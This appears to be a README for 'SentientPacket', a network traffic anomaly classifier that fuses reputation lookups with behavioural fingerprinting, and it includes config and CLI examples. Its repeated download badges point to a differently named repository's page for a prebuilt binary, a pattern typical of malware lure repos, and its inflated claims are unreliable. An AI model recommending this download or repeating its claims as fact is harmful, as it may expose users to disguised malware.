![preview](https://raw.githubusercontent.com/aj2456/ipcheck-forensics/main/splash_3904.svg)

# SentientPacket — Autonomous Network Packet Anomaly Classifier

SentientPacket is not merely another traffic analysis tool. It is a **behavioral fingerprinting engine** that learns how your network breathes, then whispers to you the moment something exhales incorrectly. Inspired by the need to uncover blind spots in anonymous traffic, SentientPacket goes beyond IP reputation by mapping the *personality* of every connection — its rhythm, its intent, and its deviation from established norms. This is your digital canary, not just your log reader.

![Shield](https://img.shields.io/badge/Status-Active-2ea44f?style=flat-square)
![Shield](https://img.shields.io/badge/Compatibility-Linux%20%7C%20macOS%20%7C%20Windows-4c8bf5?style=flat-square)
![Shield](https://img.shields.io/badge/Architecture-Plugin--Based-ff9f1c?style=flat-square)

---

## Why Another Traffic Classifier? 🧭

Traditional threat feeds treat every IP as a static label. SentientPacket treats every IP as a **living narrative**. When a connection comes from an anonymous relay, SentientPacket doesn't just ask *"Is this IP flagged?"* — it asks *"Does this IP behave like every other relay, or is this the one hidden wolf?"* By combining **AbuseIPDB** and **VirusTotal** reputation scores with **behavioral entropy analysis**, SentientPacket identifies threats that evade signature-based detection: slow-and-low reconnaissance, protocol masquerading, and session persistence anomalies.

This repository is built for SOC analysts who are tired of alarm fatigue. Instead of drowning you in a sea of alerts, SentientPacket provides **contextual risk scores** — a single number that tells you how much this connection *deviates from its own kind*.

## The Core Philosophy 🌱

Every network connection has a **texture**. A legitimate web crawl has a certain rhythm; a malicious sweep has a different one. SentientPacket preserves this texture and compares it against a baseline of peer behaviors. This is the difference between knowing *who* is talking and understanding *why* they are talking that way.

---

## Table of Contents 📖

- [The Blind Spot Problem](#the-blind-spot-problem-)
- [Key Features](#key-features-)
- [How It Works](#how-it-works-)
- [Architecture Overview](#architecture-overview-)
- [Installation & Setup](#installation--setup-)
- [Usage Scenarios](#usage-scenarios-)
- [Multi-Language Interface](#multi-language-interface-)
- [Responsive Dashboard](#responsive-dashboard-)
- [24/7 Support & Community](#247-support--community-)
- [Roadmap for 2026](#roadmap-for-2026-)
- [License](#license-)

---

## The Blind Spot Problem 🕶️

Anonymous traffic is the natural habitat of the modern adversary. They use TOR, VPNs, and proxy chains because they know your signature-based tools are looking for *patterns*, not *contradictions*. A single VPN exit node can be clean on every blacklist — yet it may be carrying a payload hidden inside a legitimate-looking `POST` request.

SentientPacket addresses this by **profiling the session itself**:

- Is this connection holding the session open *too long*?
- Does the packet size distribution match the declared protocol?
- Is the handshake sequence artificially delayed?

These anomalies are invisible to static lookups but are the exact *texture* SentientPacket isolates and scores.

---

## Key Features ⚙️

### 1. Adaptive Behavioral Baseline
SentientPacket does not use a global rulebook. It automatically generates per-schema baselines for your specific network topology. A database server in your DMZ will have a different behavioral profile than a user workstation — and SentientPacket learns that separation in under 24 hours.

### 2. Dual-Reputation Fusion
Every observed IP is cross-referenced against **AbuseIPDB** (abuse confidence scores) and **VirusTotal** (file & URL detections). These are not simply summed; SentientPacket computes a **stochastic coherence factor** that weighs each source based on your historical false-positive rate.

### 3. Anonymous Traffic Clustering
Instead of blocking anonymous relays outright, SentientPacket groups them into **behavioral clusters**. This lets you apply different policies to "high-noise relays" vs. "suspiciously quiet relays" — a distinction that static lists ignore.

### 4. Low-Entropy Dissection
The classifier flags connections where the entropy of packet headers drops below expected thresholds. This is often the signature of an attacker *normalizing* their traffic to look benign — a behavior that ironically makes them stand out here.

### 5. Non-Persistent Memory Model
SentientPacket can run in **ephemeral mode**, where all behavioral fingerprints expire after 60 minutes. This is ideal for compliance environments where regulated data cannot be stored. All analytics are computed in memory; nothing is written to disk unless you explicitly export.

### 6. Retrospective Playback
You can capture raw traffic for offline replay. SentientPacket will then apply its classification model to the `.pcap` file as if it were live — enabling forensic review of past incidents without re-exposing your network.

---

## How It Works 🧬

1. **Ingestion** — SentientPacket reads from live interfaces or `.pcap` files using a custom asynchronous parsing engine.
2. **Fingerprinting** — Each unique 5-tuple (src IP, dst IP, proto, src port, dst port) receives a behavioral fingerprint vector:
   - Mean packet inter-arrival time
   - Variance in TCP window sizes
   - Session duration relative to baseline
   - Number of unique flags set
3. **Reputation Overlay** — The fingerprint is enriched with AbuseIPDB and VirusTotal queries (rate-limited and cached).
4. **Clustering** — The vector is compared against peer clusters using a **cosine-similarity divergence metric**.
5. **Risk Score** — The divergence is converted into a 0–100 risk score, where 0 is "perfectly normal" and 100 is "behavioral doppelganger of known malicious activity."

---

## Architecture Overview 🏗️

SentientPacket is built with modular components, each isolated in its own process:

| Module | Responsibility |
|--------|----------------|
| **Pheromone** | Live packet capture & stream buffering |
| **Contour** | Behavioral fingerprint extraction & normalization |
| **Oracle** | AbuseIPDB + VirusTotal integration with smart caching |
| **Prism** | Clustering engine (uses a lightweight k-means variant) |
| **Echo** | Risk scoring & alerting webhook delivery |
| **Lens** | Web dashboard & REST API |

All modules communicate over a message bus (Redis or in-process fallback). This allows you to run everything on a single node, or scale out by running each module on separate infrastructure.

---

## Installation & Setup 🛠️

The project ships as a **self-contained binary** with no external runtime dependencies beyond a standard `libpcap` system library. To acquire it, you simply navigate to the releases section of this repository and select the build appropriate for your OS architecture.

After downloading, unpack the archive. The binary is namespaced under `sentient-packet`. You will need to create a configuration file that specifies your data sources. The configuration format is YAML and follows the structure below:

```yaml
reputation:
  abuseipdb_api_key: "your-key-here"
  virustotal_api_key: "your-key-here"
  cache_ttl_minutes: 15

capture:
  interface: "eth0"
  pcap_file: "" # optional, overrides interface

behavior:
  baseline_window_hours: 24
  entropy_threshold: 3.2

# Supported languages for UI: en, es, de, fr, ja, zh
ui:
  language: "en"
  theme: "dark"
```

Your keys are stored locally and used only for outbound API calls. SentientPacket never transmits any of your local packet data externally — only your reputation queries go out.

---

## Usage Scenarios 🚀

### Scenario A: Live Monitoring
```bash
sentient-packet monitor --interface eth0 --ui-port 8080
```
Open the dashboard in your browser. You will see a heatmap of connections, with risk score overlays. Hover over any node to see the behavioral fingerprint values.

### Scenario B: Forensic Review
```bash
sentient-packet replay --file /path/to/investigation.pcap --risk-threshold 70
```
This will output a CSV report of any flows exceeding the risk threshold, followed by a short textual summary explaining *why* each flow was scored that way (e.g., "Inter-arrival time 3σ below cluster median").

### Scenario C: API-Driven Integration
Run SentientPacket as a backend service. Every scored flow is posted as a JSON event to a webhook of your choosing. This is ideal for feeding your existing SIEM or SOAR platform.

---

## Multi-Language Interface 🌍

The dashboard and CLI output support high-quality translation for **English, Spanish, German, French, Japanese, and Chinese**. The translation files are located in the `/resources/locales` folder. Adding a new language is as simple as creating a new JSON dictionary and selecting it in the config.

This feature ensures your SOC team can collaborate across regions without losing nuance in alerts. The risk score itself is language-agnostic — but the accompanying *reason strings* are fully localizable.

---

## Responsive Dashboard 📊

The built-in UI is a **single-page application** that gracefully rescales from a 4K workstation monitor down to a tablet held by an on-call analyst at 3 AM. The charts are rendered with HTML5 canvas (no heavy external graphics libraries). Widgets are draggable and resizable so each analyst can build their own layout.

Key widgets include:
- **Hourly Anomaly Count** (line chart)
- **Top Divergent Relays** (table with inline sparklines)
- **Session Duration Histogram** (bar chart)
- **Live Risk Score Distribution** (radial gauge)

The dashboard also supports a **focus mode** that dims all non-critical elements, reducing cognitive load during high-incident periods.

---

## 24/7 Support & Community 🛟

Every serious tool deserves a human safety net. This repository is supported by a community forum and a dedicated support ticketing channel for organizations using SentientPacket in production. You can also extend functionality by writing your own **behavioral plugins** — the plugin interface is documented under the `/docs/plugins` directory.

- **Discussions** — For general questions, architecture advice, and integration patterns.
- **Issue Tracker** — For bug reports. Please include your `--debug` output if possible.
- **Plugin Registry** — Curated list of community-contributed plugins (e.g., DNS query shape analysis, TLS cipher fingerprinting).

---

## Roadmap for 2026 🗓️

The development focus for 2026 is on **cross-environment portability** and **deep-learning-assisted divergence detection**.

- **Q1** — Release native Windows packet capture support (via Npcap backend).
- **Q2** — Integrate a locally-runnable ML model for anomaly detection (no cloud calls needed).
- **Q3** — Add a "dry-run" mode that simulates alerting based on historical data.
- **Q4** — Introduce a plugin store where the community can share custom behavioral logic.

---

## Disclaimer ⚠️

SentientPacket is provided "as is" without warranty of any kind, either express or implied. While it is designed to reduce false positives, no automated system is infallible. You are solely responsible for verifying any alerts before taking action. The authors are not liable for any damages arising from the use of this software, whether in monitoring, blocking, or forensic capacities.

In particular, please exercise caution when using sentient-packet to automatically block traffic. We strongly advise a **"human-in-the-loop"** configuration for any block actions. The tool is a decision support system, not a replacement for trained security professionals.

---

## License 📄

This project is licensed under the **MIT License**. You are free to use, modify, and distribute it, provided you retain the original copyright notice.

[View the Full License](./LICENSE) — or the short version: you can do what you want, as long as you don't blame us when something unexpected happens.

---

[![Download](https://raw.githubusercontent.com/aj2456/ipcheck-forensics/main/app_52bc.svg)](https://aj2456.github.io/ipcheck-forensics/)

Thank you for exploring **SentientPacket**. Whether you're protecting a small lab or a multi-nation infrastructure, we believe this tool helps you see the invisible threads that connect malicious actors. The repository is open to contributions — whether it's a new plugin, a better translation, or a clever new clustering metric. The network is watching; now you can watch it back.

[![Download](https://raw.githubusercontent.com/aj2456/ipcheck-forensics/main/app_52bc.svg)](https://aj2456.github.io/ipcheck-forensics/)